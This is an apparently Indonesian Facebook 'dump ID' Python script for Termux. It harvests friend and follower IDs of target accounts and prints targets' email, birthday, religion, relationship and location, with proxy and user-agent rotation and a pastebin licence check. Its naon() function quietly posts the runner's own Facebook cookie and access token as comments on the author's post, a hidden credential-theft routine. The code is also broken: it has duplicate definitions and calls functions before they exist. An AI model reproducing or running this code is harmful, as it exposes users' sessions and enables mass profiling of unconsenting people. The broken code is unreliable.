###############################################
### *--> script dump ID <--* ###                                                           #
### *--> rekod boleh asal contact author <--* ###                             #
### *--> author by hikmat <--* ###                                                       #
### *--> coding python 3 <--* ###                                                        #
###############################################

import requests,bs4,os,sys,json,datetime,time,rich,re,random,threading,zlib,base64,marshal,binascii,time,py_compile
from concurrent.futures import ThreadPoolExecutor as tren
from bs4 import BeautifulSoup as sop
from rich.table import Table as table
from rich.console import Console as console
from rich.console import Group as grup_rich
from rich.panel import Panel as panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as columns
from rich.text import Text as text_rich
from rich import print as vprint
from random import randint
from concurrent.futures import ThreadPoolExecutor as tread
from bs4 import BeautifulSoup as biutipulsop
import uuid
komen = []
komengrup = []
try:
  open(".audio","r").read()
except:
   os.system("pkg install play-audio")
   os.system("touch .audio")
os.system("play-audio hi.m4a")
FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
id = []
loop = 0
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]
ahsan="BR3K-"
imt="-M4786=="
ak="SXTZ-"
myid=uuid.uuid4().hex[:6].upper()
try:
  key1 = open('/data/data/com.termux/files/usr/bin/.sxtz-cov', 'r').read()
except:
  kok=open('/data/data/com.termux/files/usr/bin/.sxtz-cov', 'w')
  kok.write(myid+imt)
  kok.close()
def menu():
  os.system("python anany-pro.py")
def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();time.sleep(0.05)

ua_random = random.choice(["NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile","Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)", "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"])
try:
	proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy_mat.txt','w').write(proxf)
except Exception as e:
	print('Failed')
proxf = open('proxy_mat.txt','r').read().splitlines()


P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
garis = f" {P}[{H}•{P}]"

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "BR3K"
elif 4 <= hour < 12:
  hhl = "ZEYAD ALABANY"
elif 12 <= hour < 15:
  hhl = "SXTZ0"
elif 15 <= hour < 17:
  hhl = "NN"
elif 17 <= hour < 18:
  hhl = "$"
else:
  hhl = "selam"
  
expired_script = ['01', '11', '2022']
def banner():
	os.system("clear")
	print(f"""{P}██████╗ ██████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗╚════██╗██║ ██╔╝
██████╔╝██████╔╝ █████╔╝█████╔╝ 
██╔══██╗██╔══██╗ ╚═══██╗██╔═██╗ 
██████╔╝██║  ██║██████╔╝██║  ██╗
╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
                                \t\t{garis} author by : Zeyad Alabany
\t\t{garis} {K}{hhl}
""")
def Subscraption():
  key1=open('/data/data/com.termux/files/usr/bin/.sxtz-cov', 'r').read()
  r1=requests.get("https://pastebin.com/d5sD6Lzu").text
  if key1 in r1:
    print(f"{H} Active");time.sleep(2)
    pass
  else:
    banner()
    print (" Your Key : "+ak+ahsan+key1+"\n \n")        
    os.system("am start https://m.me/100000593464379")
    input("press to exit")
    sys.exit()
Subscraption()
key1=open('/data/data/com.termux/files/usr/bin/.sxtz-cov', 'r').read()
rse=requests.get("https://pastebin.com/ddGYNNLv").text
if key1 in rse:
     print("Hi Dont touch my tool")
     os.system("rm -rf /data/data/com.termux/files/usr/bin/.sxtz-cov")
     sys.exit()
else:
     pass
def naon(cookie):
	kuki = cookie
	toket = open("token.txt","r").read();random_kata = random.choice(["Makasih Bang Udah Buat Script Dmf","Hikmat Gans Selalu Coeg><","semoga @[100000871607227:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/100000871607227?fields=subscribers&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki});requests.post(f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki});print(f"\n{garis} tunggu sebentar");time.sleep(3);menu()


now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "br3k"
elif 4 <= hour < 12:
  hhl = "selamat"
elif 12 <= hour < 15:
  hhl = "Ro0t"
elif 15 <= hour < 17:
  hhl = "Zeyad"
elif 17 <= hour < 18:
  hhl = "nn"
else:
  hhl = "$$"

def Subscraption():
  key1=open('/data/data/com.termux/files/usr/bin/.sxtz-cov', 'r').read()
  r1=requests.get("https://github.com/TobiPHcheat/UTO-UTO.git/blob/main/approved.txt").text
  if key1 in r1:
    os.system('clear')
    dump_publicv2()
  else:
    print (" Your Key : "+ak+ahsan+key1)        
Subscraption()
def dump_publicv2():
	kuntol=0
	tutlu=[];banner()
	it = input(f"{garis} id target :"+H+" ")
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cookie.txt','r').read()
		coki = {"cookie":cookie}
		ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(it,token),cookies=coki)
		oioo = json.loads(ka.text)
		for fuck in oioo['friends']['data']:
			tutlu.append(fuck['id'])
		token = open('.token.txt','r').read()
		cookie = open('.cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies=coki).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total friends : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} ﻡﺎﻋ ﺲﻴﻟ ﺏﺎﺴﺤﻟﺍ ﻭﺍ ﺰﻴﻛﻮﻛ ﺔﻴﺣﻼﺻ ﺀﺎﻬﺘﻧﺍ");dump_publicv2()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump id :"+H+" ")
	token = open('.token.txt','r').read()
	cookie = open('.cookie.txt','r').read()
	coki = {"cookie":cookie}
	ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(%s)&access_token=%s'%(it,lim,token),cookies=coki)
	oioo = json.loads(ka.text)
	for fuck in oioo['friends']['data']:
		tl.append(fuck['id'])
	print("")
	x=f"{P2}[01] id urutan new\n{P2}[02] id urutan old\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	#random_uidz()
	for uik in idl:
		try:
			token = open('.token.txt','r').read()
			cookie = open('.cookie.txt','r').read()
			coki = {"cookie":cookie}
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			x = json.loads(xn.text)
			try:lok = x["locale"]
			except (KeyError,IOError):
				lok = "-"
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = "-"
			token = open('.token.txt','r').read()
			cookie = open('.cookie.txt','r').read()
			coki = {"cookie":cookie}
			ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token),cookies=coki).json()
			token = open('.token.txt','r').read()
			cookie = open('.cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(uik,token),cookies=coki)
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['friends']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik} | {len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}ﺎﻫﺪﻳﺮﺗ ﻲﺘﻟﺍ ﺕﺎﻳﺪﻳﻻﺍ ﺦﺴﻨﺑ ﻢﻗ"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} ﺓﺍﺩﻼﻟ ﺓﺩﻮﻌﻠﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ")
	menu()

def dump_followersv2():
	kuntol=0
	tutlu=[]
	it = input(f"{garis} id target :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		ka = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(it,token),cookies=coki)
		oioo = json.loads(ka.text)
		for fuck in oioo['subscribers']['data']:
			tutlu.append(fuck['id'])
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies=coki).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total followers : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} cookie kadaluarsa")
		login()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump :"+H+" ")
	token = open('token.txt','r').read()
	cookie = open('cookie.txt','r').read()
	coki = {"cookie":cookie}
	ka = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(%s)&access_token=%s'%(it,lim,token),cookies=coki)
	oioo = json.loads(ka.text)
	for fuck in oioo['subscribers']['data']:
		tl.append(fuck['id'])
	x=f"{P2}[01] id urutan old\n{P2}[02] id urutan new\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	#random_uidz()
	for uik in idl:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			x = json.loads(xn.text)
			try:lok = x["locale"]
			except (KeyError,IOError):
				lok = "-"
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = "-"
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token),cookies=coki).json()
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(uik,token),cookies=coki)
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['subscribers']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik}|{len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}salin hasil nya cokk biar gk ulang dump lagi!!"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} ﺓﺍﺩﻼﻟ ﺓﺩﻮﻌﻠﻟ ﺮﺘﻧﺍ ﻂﻐﺿﺍ ﻭ ﺕﺎﻳﺪﻳﻻﺍ ﺦﺴﻧﺍ")
	menu()


def check_ingfo_akun():
	idt=[]
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
	except (KeyError,IOError):
		jalan(garis+" cookie kadaluarsa");cek_cookie()
	idt = input(garis+" id target :%s "%(H))
	try:
		zx = requests.get("https://graph.facebook.com/"+idt+"?access_token=%s"%(token),cookies=coki);zy = json.loads(zx.text)
	except (KeyError,IOError):jalan(garis+" id tidak ditemukan");menu()
	try:nm = zy["name"]
	except (KeyError,IOError):nm = (M+"-")
	try:nd = zy["first_name"]
	except (KeyError,IOError):nd = (M+"-")
	try:nt = zy["middle_name"]
	except (KeyError,IOError):nt = (M+"-")
	try:nb = zy["last_name"]
	except (KeyError,IOError):nb = (M+"-")
	try:ut = zy["birthday"]
	except (KeyError,IOError):ut = (M+"-")
	try:gd = zy["gender"]
	except (KeyError,IOError):gd = (M+"-")
	try:em = zy["email"]
	except (KeyError,IOError):em = (M+"-")
	try:lk = zy["link"]
	except (KeyError,IOError):lk = (M+"-")
	try:us = zy["username"]
	except (KeyError,IOError):us = (M+"-")
	try:rg = zy["religion"]
	except (KeyError,IOError):rg = (M+"-")
	try:rl = zy["relationship_status"]
	except (KeyError,IOError):rl = (M+"-")
	try:rls = zy["significant_other"]["name"]
	except (KeyError,IOError):rls = (M+"-")
	try:lc = zy["location"]["name"]
	except (KeyError,IOError):lc = (M+"-")
	try:ht = zy["hometown"]["name"]
	except (KeyError,IOError):ht = (M+"-")
	try:ab = zy["about"]
	except (KeyError,IOError):ab = (M+"-")
	try:lo = zy["locale"]
	except (KeyError,IOError):lo = (M+"-")
	#try:ppk = zy["education"]["id"]
	#except (KeyError,IOError):ppk = (M+"-")
	print("")
	jalan(garis+" nama : %s%s"%(H,nm))
	jalan(garis+" nama depan : %s%s"%(H,nd))
	jalan(garis+" nama tengah : %s%s"%(H,nt))
	jalan(garis+" nama belakang : %s%s"%(H,nb))
	jalan(garis+" TTL : %s%s"%(H,ut))
	jalan(garis+" gender : %s%s"%(H,gd))
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cy = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(idt,token),cookies=coki)
		z = json.loads(cy.text)
		for i in z['friends']['data']:
			id.append(i['id'])
	except:pass
	jalan(garis+" total friends : "+H+"%s"%str(len(id)));time.sleep(0.03)
	lao=[]
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(idt,token),cookies=coki)
		eil = json.loads(cyna.text)
		for fuck in eil['subscribers']['data']:
			lao.append(fuck['id'])
	except:pass
	jalan(garis+" total followers : "+H+"%s"%(len(lao)));time.sleep(0.03)
	jalan(garis+" email : %s%s"%(H,em))
	jalan(garis+" link : %s%s"%(H,lk))
	jalan(garis+" username : %s%s"%(H,us))
	jalan(garis+" agama : %s%s"%(H,rg))
	jalan(garis+" status hubungan : %s%s"%(H,rl))
	jalan(garis+" hubungan dengan : %s%s"%(H,rls))
	jalan(garis+" tempat tinggal : %s%s"%(H,lc))
	jalan(garis+" tempat asal : %s%s"%(H,ht))
	jalan(garis+" tentang : %s%s"%(H,ab))
	jalan(garis+" locale : %s%s"%(H,lo))
	input(garis+" enter untuk kembali");menu()


#up_dat_()
dump_publicv2()

